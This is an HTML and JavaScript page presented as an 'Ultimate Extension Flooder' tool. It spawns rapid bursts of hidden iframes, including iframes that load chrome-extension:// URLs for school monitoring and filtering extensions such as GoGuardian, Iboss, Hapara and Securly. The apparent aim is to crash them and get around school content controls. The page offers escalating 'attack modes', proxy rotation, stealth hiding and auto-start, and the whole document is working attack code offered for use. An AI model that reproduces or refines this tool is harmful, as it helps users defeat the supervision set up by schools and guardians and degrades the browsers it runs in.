<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Ultimate Extension Flooder Tool</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #0f0;
      font-family: 'Courier New', Courier, monospace;
      overflow-x: hidden;
    }
    h1, h2 {
      text-align: center;
      margin-top: 20px;
    }
    .container {
      width: 90%;
      max-width: 900px;
      margin: 20px auto;
      background: #111;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 15px #0f0;
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    input, select, button, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 8px;
      border-radius: 4px;
      border: 1px solid #333;
      background: #222;
      color: #0f0;
    }
    button {
      background-color: #0f0;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      opacity: 0.8;
    }
    .controls {
      margin-top: 20px;
    }
    select[multiple] {
      height: 200px;
      overflow-y: scroll;
    }
    .status {
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }
    #iframeContainer {
      display: none;
    }
  </style>
</head>
<body>

<h1>Ultimate Extension Flooder</h1>

<div class="container">
  <div class="controls">
    <label for="targetUrl">Target URL:</label>
    <input type="text" id="targetUrl" value="https://www.wikipedia.org">

    <label for="iframeCount">Number of Iframes:</label>
    <input type="number" id="iframeCount" value="50">

    <label for="proxyList">Proxy List (comma-separated):</label>
    <textarea id="proxyList" placeholder="http://proxy1.com, http://proxy2.com"></textarea>

    <label for="extensionDropdown">Extensions to Target (scroll and select):</label>
    <select id="extensionDropdown" multiple></select>

    <label for="customExtension">Add Custom Extension ID:</label>
    <input type="text" id="customExtension" placeholder="Paste extension ID here">
    <button onclick="addCustomExtension()">Add Extension ID</button>

    <label for="mode">Attack Mode:</label>
    <select id="mode">
      <option value="normal">Normal</option>
      <option value="crazy">Crazy</option>
      <option value="insane">Insane</option>
      <option value="ultra">Ultra-Insane</option>
    </select>

    <label><input type="checkbox" id="stealthMode"> Stealth Mode (hide iframes)</label>
    <label><input type="checkbox" id="debugMode"> Debug Mode (console logs)</label>
    <label><input type="checkbox" id="autoStart"> Auto-Start on Page Load</label>

    <div style="margin-top:15px;">
      <button onclick="startFlood()">Start Flood</button>
      <button onclick="stopFlood()">Kill Switch</button>
    </div>

    <div class="status" id="status">Status: Ready</div>
  </div>
</div>

<div id="iframeContainer"></div>

<script>
let flooding = false;
let frameCounter = 0;
let proxyIndex = 0;
let activeIframes = [];
let extensions = [];
const knownExtensions = [
  "hmlkkhdkdmmnoedakemajgcfmjmkdpkk", // GoGuardian
  "iodihamcpbpeioajjeobimgagajmlibd", // Iboss
  "ljfoeinjpaedjfecbmggjgodbgkmjkjk", // Hapara
  "joflmkccibkooplaeoinecjbmdebglab", // Securly
  "felcaaldnbdncclmgdcncolpebgiejap"  // Example locked extension
];

// Auto-fill dropdown
function loadExtensions() {
  const dropdown = document.getElementById('extensionDropdown');
  knownExtensions.forEach(id => {
    const option = document.createElement('option');
    option.value = id;
    option.textContent = id;
    dropdown.appendChild(option);
  });
}

// Allow adding custom extensions
function addCustomExtension() {
  const id = document.getElementById('customExtension').value.trim();
  if (id.length > 0) {
    const dropdown = document.getElementById('extensionDropdown');
    const option = document.createElement('option');
    option.value = id;
    option.textContent = id;
    dropdown.appendChild(option);
    document.getElementById('customExtension').value = '';
  }
}

// Start flooding
function startFlood() {
  if (flooding) return;
  flooding = true;
  document.getElementById('status').innerText = "Status: Flooding...";
  frameCounter = 0;
  activeIframes = [];
  const target = document.getElementById('targetUrl').value;
  const iframeCount = parseInt(document.getElementById('iframeCount').value);
  const proxies = document.getElementById('proxyList').value.split(',').map(p => p.trim()).filter(p => p);
  const stealth = document.getElementById('stealthMode').checked;
  const debug = document.getElementById('debugMode').checked;
  const mode = document.getElementById('mode').value;
  const extensions = Array.from(document.getElementById('extensionDropdown').selectedOptions).map(o => o.value);

  let delay = 500;
  if (mode === 'crazy') delay = 250;
  if (mode === 'insane') delay = 100;
  if (mode === 'ultra') delay = 25;

  for (let i = 0; i < iframeCount; i++) {
    setTimeout(() => {
      let proxyTarget = target;
      if (proxies.length > 0) {
        proxyTarget = proxies[proxyIndex % proxies.length] + "/" + target;
        proxyIndex++;
      }

      const iframe = document.createElement('iframe');
      iframe.src = proxyTarget;
      iframe.style.width = stealth ? "0" : "300px";
      iframe.style.height = stealth ? "0" : "300px";
      iframe.style.border = "none";
      iframe.loading = "eager";

      document.getElementById('iframeContainer').appendChild(iframe);
      activeIframes.push(iframe);

      // Extension crash attempts
      extensions.forEach(ext => {
        const extIframe = document.createElement('iframe');
        extIframe.src = "chrome-extension://" + ext + "/";
        extIframe.style.width = "0";
        extIframe.style.height = "0";
        extIframe.style.border = "none";
        document.getElementById('iframeContainer').appendChild(extIframe);
        activeIframes.push(extIframe);
      });

      frameCounter++;
      if (debug) console.log(`Frame ${frameCounter} created.`);

      if (mode === 'ultra') {
        for (let r = 0; r < 3; r++) { // Recursive iframe
          const recursive = document.createElement('iframe');
          recursive.src = proxyTarget;
          recursive.style.width = "0";
          recursive.style.height = "0";
          document.getElementById('iframeContainer').appendChild(recursive);
          activeIframes.push(recursive);
        }
      }
    }, delay * i);
  }
}

// Stop flooding and clean
function stopFlood() {
  flooding = false;
  document.getElementById('status').innerText = "Status: Stopped.";
  activeIframes.forEach(iframe => iframe.remove());
  activeIframes = [];
  if (document.getElementById('debugMode').checked) console.log("All iframes removed.");
}

// Auto-Start if enabled
window.onload = function() {
  loadExtensions();
  if (document.getElementById('autoStart').checked) {
    startFlood();
  }
}
</script>

</body>
</html>
